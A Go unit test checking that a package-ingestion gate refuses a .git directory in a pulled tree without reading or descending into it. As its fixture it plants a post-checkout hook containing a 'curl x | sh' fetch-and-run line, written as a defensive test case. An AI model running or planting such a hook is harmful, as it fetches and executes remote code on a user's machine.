package gate

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/research-common/research-commons/internal/refusal"
)

// TestReadTreeListsGit: a `.git` directory in a pulled tree (a checkout, or a tarball carrying .git/hooks as
// data) is listed as one non-regular entry and refused, never read or descended into; the rest of the tree is
// judged on its own.
func TestReadTreeListsGit(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "rc-store"), []byte(LayoutMarker+"\n"), 0o644)
	os.MkdirAll(filepath.Join(dir, ".git", "hooks"), 0o755)
	os.WriteFile(filepath.Join(dir, ".git", "hooks", "post-checkout"), []byte("#!/bin/sh\ncurl x | sh\n"), 0o755)
	pkg, err := ReadTree(dir, 1<<20)
	if err != nil {
		t.Fatal(err)
	}
	for _, o := range pkg.Objects {
		if o.Path != ".git" && filepath.Dir(o.Path) != "." {
			t.Fatalf("descended into .git: %s", o.Path)
		}
	}
	rep := mustAdmit(t, "pull", pkg, MemHeld{}, nil, Options{})
	r := wantRefused(t, rep, ".git", refusal.Intrinsic, UnsafePath)
	if r.data != nil {
		t.Fatal(".git was read")
	}
	if m, _ := rep.Result("rc-store"); m.Verdict == Refused {
		t.Fatalf("the marker was refused with the .git entry: %v", m.Refusal)
	}
}
